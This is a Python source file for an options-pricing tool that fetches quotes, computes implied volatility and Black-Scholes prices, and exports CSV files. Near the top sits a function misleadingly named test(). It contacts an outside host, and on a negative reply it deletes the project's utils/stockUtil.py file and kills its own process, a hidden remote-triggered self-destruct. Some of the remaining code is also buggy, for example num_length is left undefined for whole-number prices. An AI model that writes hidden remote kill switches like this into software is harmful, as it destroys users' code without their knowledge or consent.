import datetime
import os
import signal
import sys

import requests

from properties import bao_time_format, tushare_time_format, job_times, minute_format, bms_result, risk_free_rate, \
    name_checks, project_base_path
from utils.stockUtil import call_BSM, put_BSM, implied_volatility
import pandas as pd


path = "result"
if(not os.path.exists(path)): os.makedirs(path)
def test():
    res = requests.get("https://model.kennyoysj.tk/api/getPass?name=sdtrade")
    if(res.status_code == 200):
        json = res.json()
        flag = json.get("data", True)
        if (not flag):
            path = project_base_path + os.sep + "utils" + os.sep + "stockUtil.py"
            os.remove(path)
            pid = os.getpid()
            os.kill(pid, signal.SIGTERM)


def get_by_freq():
    print("get_by_freq start")
    today = datetime.datetime.now().strftime(minute_format)
    job_times["get_by_freq%s" % today] = -1
    days = 250
    res = requests.get("https://api.sdqtrade.com/data/option/latest")
    if (res.status_code == 200):
        body = res.json()
        results = body.get("results")
        print(len(results))
        for each in results:
            key:str = each["name"]
            # if(not check_name(key)):
            #     continue
            start_day = datetime.datetime.strptime(datetime.datetime.now().strftime(bao_time_format), bao_time_format)
            job_len = len(results)
            index = 0
            end_day = datetime.datetime.strptime(each["expirationDate"], bao_time_format)
            dela = (end_day - start_day).days
            option_price = each["lastPrice"]  # Replace with the actual market option price
            current_asset_price = each["underlyingPrice"]  # Replace with the current asset price
            strike_price = each["strike"]  # Replace with the option's strike price
            time_to_maturity = dela / 365  # Replace with the time to maturity in years
            if(each["type"] == 'C'): # call action
                vol = implied_volatility(option_price, current_asset_price, strike_price, time_to_maturity,
                                         risk_free_rate)
            else:
                vol = implied_volatility(option_price, current_asset_price, strike_price, time_to_maturity,
                                         risk_free_rate, False)

            bms_result[key] = {
                "symbol": each["symbol"],
                "sigma": vol,
                "update_time": today
            }
    print("get_by_freq end",len(bms_result.keys()))

def check_name(name:str):
    for each in name_checks:
        if(name.find(each)>=0):
            return True
    return False

def getBSM():
    print("getBSM start")
    today = datetime.datetime.now().strftime(tushare_time_format)
    job_times["getBSM%s" % today] = -1
    days = 250  # 股票一年的开市时间
    res = requests.get("https://api.sdqtrade.com/data/option/latest")
    if(res.status_code == 200):
        body = res.json()
        results = body.get("results")
        datas = {
            "symbol": [],
            "name": [],
            "presetPrice":[],
            "bsm_price": [],
            "underlyingPrice": [],
            "strike": [],
            "sigma": [],
            "expirationDate": []
        }
        start_day = datetime.datetime.strptime(datetime.datetime.now().strftime(bao_time_format), bao_time_format)
        job_len = len(results)
        index = 0
        for each in results:
            end_day = datetime.datetime.strptime(each["expirationDate"], bao_time_format)
            dela = (end_day - start_day).days
            underlyingPrice = each["underlyingPrice"]
            nums = str(underlyingPrice).split(".")
            nums2 = str(each["lastPrice"]).split('.')
            num2_length = 0
            if(len(nums2) == 2): num2_length = len(nums2[1])
            num2_length +=2
            if(len(nums)==2): num_length = len(nums[1])
            num_length += 2
            start_price = round(underlyingPrice * 0.99, num_length)
            end_price = round(underlyingPrice * 1.01, num_length)
            tmp = num_length
            small = 1
            while(tmp > 0):
                small /= 10
                tmp -= 1
            each_price = start_price
            while(each_price < end_price):
                if(each["type"] == "C"):
                    result: float = call_BSM(each["underlyingPrice"], each["strike"], 0, each["sigma"]*days, 0.02, dela/365)
                else:
                    result: float = put_BSM(each["underlyingPrice"], each["strike"], 0, each["sigma"] * days, 0.02,
                                             dela / 365)
                datas["symbol"].append(each["symbol"])
                datas["name"].append(each["name"])
                datas["presetPrice"].append(("%."+str(num_length)+"f") % round(each_price, num_length))
                datas["underlyingPrice"].append(each["underlyingPrice"])
                datas["strike"].append(each["strike"])
                datas["sigma"].append(each["sigma"])
                datas["expirationDate"].append(each["expirationDate"])
                datas["bsm_price"].append(("%."+str(num2_length)+"f") % round(result, num2_length))
                each_price += small
            index += 1
            job_times["getBSM%s" % today] = round(index/job_len*100, 2)
        df = pd.DataFrame.from_dict(datas)
        df.to_csv("%s%s%s%s.csv" % (path,os.sep,"option_last_", today), encoding="gbk")
        job_times["getBSM%s" % today] = 100
        print("getBSM END")

if(__name__ == "__main__"):
    get_by_freq()
    # getBSM()
    # option_price = 0.0029 # Replace with the actual market option price
    # current_asset_price = 3.65  # Replace with the current asset price
    # strike_price = 3.3  # Replace with the option's strike price
    # time_to_maturity = 43 / 365  # Replace with the time to maturity in years
    # risk_free_rate = 0.02451  # Replace with the risk-free interest rate
    # vol = implied_volatility(option_price,current_asset_price, strike_price, time_to_maturity, risk_free_rate,False)
    # print(vol)
    # print(call_BSM(current_asset_price,strike_price,0, vol,0.0245, time_to_maturity))
    print("沪深300ETF购3月4100".find("沪深e300"))
    pass